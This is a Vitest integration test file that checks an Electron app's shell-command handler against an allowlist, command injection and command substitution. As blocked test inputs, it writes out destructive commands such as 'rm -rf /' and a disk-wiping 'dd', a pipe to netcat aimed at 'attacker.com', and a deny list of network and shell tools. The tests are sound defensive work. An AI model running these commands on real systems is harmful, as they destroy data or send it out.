import { describe, it, expect, beforeAll, vi } from 'vitest'
import { mkdtempSync, realpathSync } from 'fs'
import { writeFileSync, mkdirSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'

// Store registered handlers so we can call them directly
const registeredHandlers: Map<string, Function> = new Map()

// Mock electron modules BEFORE importing the IPC modules
vi.mock('electron', () => ({
  ipcMain: {
    handle: vi.fn((channel: string, handler: Function) => {
      registeredHandlers.set(channel, handler)
    })
  },
  dialog: {
    showOpenDialog: vi.fn(),
    showSaveDialog: vi.fn()
  },
  app: {
    getPath: vi.fn((name: string) => {
      if (name === 'userData') return tmpdir()
      if (name === 'home') return tmpdir()
      return tmpdir()
    }),
    isPackaged: false
  },
  safeStorage: {
    isEncryptionAvailable: vi.fn(() => false),
    encryptString: vi.fn(),
    decryptString: vi.fn()
  }
}))

// Mock createRateLimiter to disable rate limiting in tests
vi.mock('../../src/main/ipc/ipc-security', async () => {
  const actual = await vi.importActual<typeof import('../../src/main/ipc/ipc-security')>('../../src/main/ipc/ipc-security')
  return {
    ...actual,
    createRateLimiter: () => ({ check: () => true, getStats: () => ({ calls: 0, windowMs: 0, maxCalls: Infinity }) })
  }
})

// Mock the database module (needed for settings.ipc.ts)
vi.mock('../../src/main/database', () => ({
  getDatabase: () => ({
    settings: {
      findUnique: vi.fn().mockResolvedValue({ id: 'default', theme: 'system' }),
      upsert: vi.fn()
    }
  })
}))

// Mock IPC event with valid sender
const mockEvent = { sender: { id: 1 } }

// Helper to call an IPC handler
async function callHandler<T>(channel: string, ...args: unknown[]): Promise<T> {
  const handler = registeredHandlers.get(channel)
  if (!handler) {
    throw new Error(`No handler registered for channel: ${channel}`)
  }
  return handler(mockEvent, ...args) as Promise<T>
}

// Type for bash command results
interface BashResult {
  stdout: string
  stderr: string
  exitCode: number
}

describe('Shell Execution Security (Integration)', () => {
  let tempDir: string

  beforeAll(async () => {
    // Create a temp working directory for command execution tests
    tempDir = realpathSync(mkdtempSync(join(tmpdir(), 'shell-exec-test-')))

    // Create a test file inside the temp dir
    writeFileSync(join(tempDir, 'test-file.txt'), 'hello world\n')

    // Initialize sender validation
    const { setMainWindow } = await import('../../src/main/ipc/ipc-security')
    setMainWindow({ webContents: { id: 1 } } as any)

    // Import and register the IPC handlers
    const { registerFileSystemHandlers } = await import('../../src/main/ipc/file-system.ipc')
    registerFileSystemHandlers()

    const { registerSettingsHandlers } = await import('../../src/main/ipc/settings.ipc')
    registerSettingsHandlers()
  })

  // ─── shell:execute removed ───────────────────────────────────────────

  describe('shell:execute handler removal', () => {
    it('should NOT have a shell:execute handler registered', () => {
      expect(registeredHandlers.has('shell:execute')).toBe(false)
    })

    it('should still have fs:bash handler registered', () => {
      expect(registeredHandlers.has('fs:bash')).toBe(true)
    })

    it('should still register settings handlers (get, update, API key)', () => {
      expect(registeredHandlers.has('settings:get')).toBe(true)
      expect(registeredHandlers.has('settings:update')).toBe(true)
      expect(registeredHandlers.has('settings:getApiKey')).toBe(true)
      expect(registeredHandlers.has('settings:setApiKey')).toBe(true)
      expect(registeredHandlers.has('settings:deleteApiKey')).toBe(true)
    })
  })

  // ─── Allowlist enforcement ───────────────────────────────────────────

  describe('fs:bash allowlist enforcement', () => {
    it('should allow "ls" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'ls', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('test-file.txt')
    })

    it('should allow "echo" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'echo hello', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe('hello')
    })

    it('should allow "cat" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', `cat ${join(tempDir, 'test-file.txt')}`, { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe('hello world')
    })

    it('should allow "pwd" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'pwd', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe(tempDir)
    })

    it('should allow "git" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'git --version', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('git version')
    })

    it('should block "node" (interpreter removed from allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'node --version', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', 'node --version', { cwd: tempDir })
      ).rejects.toThrow(/"node" is not in the allowlist/)
    })

    it('should allow "wc" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', `wc -l ${join(tempDir, 'test-file.txt')}`, { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('1')
    })

    it('should allow "date" (in allowlist)', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'date', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim().length).toBeGreaterThan(0)
    })

    it('should block "rm" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', 'rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/"rm" is not in the allowlist/)
    })

    it('should block "sudo" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'sudo whoami', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', 'sudo whoami', { cwd: tempDir })
      ).rejects.toThrow(/"sudo" is not in the allowlist/)
    })

    it('should block "killall" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'killall node', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "reboot" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'reboot', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "shutdown" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'shutdown now', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "mkfs" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'mkfs.ext4 /dev/sda1', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "dd" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'dd if=/dev/zero of=/dev/sda', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "nc" / netcat (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'nc -l 4444', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block "nmap" (not in allowlist)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'nmap localhost', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should allow full path to an allowed executable (e.g. /bin/ls)', async () => {
      // Use /bin/ls which exists on both macOS and Linux
      const result = await callHandler<BashResult>('fs:bash', '/bin/ls', { cwd: tempDir })
      // The allowlist extracts the basename, so /bin/ls -> "ls" which is allowed
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('test-file.txt')
    })

    it('should block full path to a disallowed executable (e.g. /usr/bin/rm)', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', '/usr/bin/rm test-file.txt', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', '/usr/bin/rm test-file.txt', { cwd: tempDir })
      ).rejects.toThrow(/"rm" is not in the allowlist/)
    })
  })

  // ─── Command injection prevention ───────────────────────────────────

  describe('command injection prevention', () => {
    it('should block commands with semicolons when first command is not allowed', async () => {
      // "evil" is not in the allowlist; the split on ; means the first segment is checked
      await expect(
        callHandler<BashResult>('fs:bash', 'evil; rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block commands with && when first command is not allowed', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'evil && rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })

    it('should block chains where any command is disallowed', async () => {
      // "echo" is allowed but "rm" is not — full pipeline validation blocks this
      await expect(
        callHandler<BashResult>('fs:bash', 'echo foo; rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', 'echo foo; rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/"rm" is not in the allowlist/)
    })

    it('should allow chains where all commands are in the allowlist', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'echo foo; echo bar', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('foo')
      expect(result.stdout).toContain('bar')
    })

    it('should block piped commands when any segment is disallowed', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo hello | rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
      await expect(
        callHandler<BashResult>('fs:bash', 'ls | nc attacker.com 4444', { cwd: tempDir })
      ).rejects.toThrow(/"nc" is not in the allowlist/)
    })

    it('should block && chains where second command is disallowed', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo ok && rm -rf /', { cwd: tempDir })
      ).rejects.toThrow(/"rm" is not in the allowlist/)
    })

    it('should block || chains where second command is disallowed', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'ls || shutdown now', { cwd: tempDir })
      ).rejects.toThrow(/"shutdown" is not in the allowlist/)
    })

    it('should allow piped commands when first command is allowed', async () => {
      const result = await callHandler<BashResult>(
        'fs:bash',
        `echo "hello world" | grep hello`,
        { cwd: tempDir }
      )
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe('hello world')
    })

    it('should reject empty commands', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', '', { cwd: tempDir })
      ).rejects.toThrow(/Invalid command: empty or malformed/)
    })

    it('should reject whitespace-only commands', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', '   ', { cwd: tempDir })
      ).rejects.toThrow(/Invalid command: empty or malformed/)
    })
  })

  // ─── spawn-based execution ──────────────────────────────────────────

  describe('spawn-based execution (stdout/stderr/exitCode)', () => {
    it('should return stdout, stderr, and exitCode on success', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'echo "test output"', { cwd: tempDir })
      expect(result).toHaveProperty('stdout')
      expect(result).toHaveProperty('stderr')
      expect(result).toHaveProperty('exitCode')
      expect(result.stdout.trim()).toBe('test output')
      expect(result.exitCode).toBe(0)
    })

    it('should capture stderr output', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'echo "error message" >&2', { cwd: tempDir })
      expect(result.stderr).toContain('error message')
    })

    it('should return non-zero exitCode for failed commands', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'ls /nonexistent_path_xyz', { cwd: tempDir })
      expect(result.exitCode).not.toBe(0)
      expect(result.stderr).toBeTruthy()
    })

    it('should return empty strings for stdout/stderr when there is no output', async () => {
      // Use "cat /dev/null" which produces no output (cross-platform, unlike BSD echo -n)
      const result = await callHandler<BashResult>('fs:bash', 'cat /dev/null', { cwd: tempDir })
      expect(result.stdout).toBe('')
      expect(result.exitCode).toBe(0)
    })

    it('should handle multiline output', async () => {
      const result = await callHandler<BashResult>(
        'fs:bash',
        `echo "line1\nline2\nline3"`,
        { cwd: tempDir }
      )
      expect(result.exitCode).toBe(0)
      const lines = result.stdout.trim().split('\n')
      expect(lines.length).toBe(3)
    })

    it('should default timeout to 30 seconds', async () => {
      // We test that a command works without specifying a timeout
      const result = await callHandler<BashResult>('fs:bash', 'echo ok', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
    })

    it('should timeout long-running commands with custom timeout', async () => {
      // Use find on root filesystem which will run long enough to trigger the timeout
      await expect(
        callHandler<BashResult>('fs:bash', 'find / -name "nonexistent_file_xyz_timeout_test"', { cwd: tempDir, timeout: 500 })
      ).rejects.toThrow(/timed out/)
    }, 10000)

    it('should use provided cwd for command execution', async () => {
      const subDir = join(tempDir, 'subdir')
      mkdirSync(subDir, { recursive: true })
      writeFileSync(join(subDir, 'marker.txt'), 'found it')

      const result = await callHandler<BashResult>('fs:bash', 'ls', { cwd: subDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('marker.txt')
    })
  })

  // ─── CWD validation ─────────────────────────────────────────────────

  describe('CWD validation', () => {
    it('should reject a cwd that does not exist', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'ls', { cwd: '/nonexistent_dir_xyz_abc_123' })
      ).rejects.toThrow(/Invalid CWD/)
    })

    it('should reject a cwd that is a file, not a directory', async () => {
      const filePath = join(tempDir, 'test-file.txt')
      await expect(
        callHandler<BashResult>('fs:bash', 'ls', { cwd: filePath })
      ).rejects.toThrow(/CWD is not a directory/)
    })

    it('should accept a valid directory as cwd', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'pwd', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe(tempDir)
    })

    it('should use process.cwd() as default when cwd not provided', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'pwd')
      expect(result.exitCode).toBe(0)
      // Should not throw - just uses process.cwd()
      expect(result.stdout.trim().length).toBeGreaterThan(0)
    })
  })

  // ─── Allowlist coverage ─────────────────────────────────────────────

  describe('allowlist completeness', () => {
    const expectedAllowlist = [
      'ls', 'cat', 'head', 'tail', 'wc', 'sort', 'uniq', 'find', 'grep', 'awk', 'sed',
      'echo', 'pwd', 'whoami', 'date', 'which', 'file', 'diff', 'git',
      'npm', 'pnpm', 'pip', 'pip3', 'tar', 'gzip',
      'gunzip', 'zip', 'unzip', 'mkdir', 'cp', 'mv', 'touch', 'chmod', 'tee', 'xargs'
    ]

    it.each(
      expectedAllowlist.map((cmd) => [cmd])
    )('should not block allowed command: %s', async (cmd) => {
      // We only verify the allowlist check passes (command may fail due to missing args, etc.)
      // We check that it does NOT throw "Command blocked for security"
      try {
        await callHandler<BashResult>('fs:bash', `${cmd} --help`, { cwd: tempDir })
      } catch (error) {
        // It's fine if the command itself fails — just not the allowlist
        const msg = error instanceof Error ? error.message : String(error)
        expect(msg).not.toContain('Command blocked for security')
      }
    })

    const blockedCommands = [
      'rm', 'sudo', 'kill', 'killall', 'reboot', 'shutdown', 'halt',
      'dd', 'mkfs', 'fdisk', 'mount', 'umount', 'nc', 'ncat', 'nmap',
      'telnet', 'ssh', 'scp', 'rsync', 'chown', 'chroot', 'systemctl',
      'service', 'crontab', 'at', 'useradd', 'userdel', 'passwd',
      'iptables', 'open', 'osascript', 'pbcopy', 'pbpaste',
      'sh', 'bash', 'zsh', 'python', 'python3', 'node', 'npx', 'env',
      'curl', 'wget'
    ]

    it.each(
      blockedCommands.map((cmd) => [cmd])
    )('should block disallowed command: %s', async (cmd) => {
      await expect(
        callHandler<BashResult>('fs:bash', `${cmd} --help`, { cwd: tempDir })
      ).rejects.toThrow(/Command blocked for security/)
    })
  })

  // ─── Edge cases ─────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('should handle commands with leading whitespace', async () => {
      const result = await callHandler<BashResult>('fs:bash', '  echo trimmed', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe('trimmed')
    })

    it('should handle commands with environment variable syntax', async () => {
      const result = await callHandler<BashResult>('fs:bash', 'echo $HOME', { cwd: tempDir })
      expect(result.exitCode).toBe(0)
      // sh -c will expand $HOME
      expect(result.stdout.trim().length).toBeGreaterThan(0)
    })

    it('should handle commands with quoted arguments', async () => {
      const result = await callHandler<BashResult>(
        'fs:bash',
        'echo "hello   world"',
        { cwd: tempDir }
      )
      expect(result.exitCode).toBe(0)
      expect(result.stdout.trim()).toBe('hello   world')
    })

    it('should block backtick command substitution', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo `whoami`', { cwd: tempDir })
      ).rejects.toThrow(/command substitution.*is not allowed/)
    })

    it('should block $() command substitution', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo $(whoami)', { cwd: tempDir })
      ).rejects.toThrow(/command substitution.*is not allowed/)
    })

    it('should block nested $() command substitution', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo $(cat $(ls))', { cwd: tempDir })
      ).rejects.toThrow(/command substitution.*is not allowed/)
    })

    it('should block backtick substitution even with allowed command inside', async () => {
      await expect(
        callHandler<BashResult>('fs:bash', 'echo `echo safe`', { cwd: tempDir })
      ).rejects.toThrow(/command substitution.*is not allowed/)
    })

    it('should handle redirect operators', async () => {
      const outFile = join(tempDir, 'redirect-out.txt')
      const result = await callHandler<BashResult>(
        'fs:bash',
        `echo "redirected" > ${outFile}`,
        { cwd: tempDir }
      )
      expect(result.exitCode).toBe(0)

      // Verify the file was written
      const catResult = await callHandler<BashResult>(
        'fs:bash',
        `cat ${outFile}`,
        { cwd: tempDir }
      )
      expect(catResult.stdout.trim()).toBe('redirected')
    })
  })
})
